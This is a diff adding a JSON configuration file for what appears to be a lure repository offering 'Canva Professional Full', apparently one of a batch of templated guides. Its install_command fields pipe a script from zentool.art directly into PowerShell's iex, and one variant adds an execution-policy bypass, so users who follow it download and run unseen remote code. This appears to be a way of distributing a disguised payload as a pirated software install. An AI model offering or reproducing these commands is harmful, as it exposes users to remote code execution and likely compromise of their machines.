@@ -1,0 +1,27 @@
+{
+  "repo": "Canva-Professional-Full",
+  "product": "Canva Professional Full",
+  "product_title": "Canva Professional",
+  "kind": "creative",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "canva-config",
+    "canva-integration",
+    "canva-latest",
+    "graphic-design",
+    "layout-tools",
+    "brand-assets",
+    "template-library",
+    "design-workflow",
+    "visual-content",
+    "canva-alternative",
+    "windows-creative"
+  ],
+  "site": "zentool.art"
+}
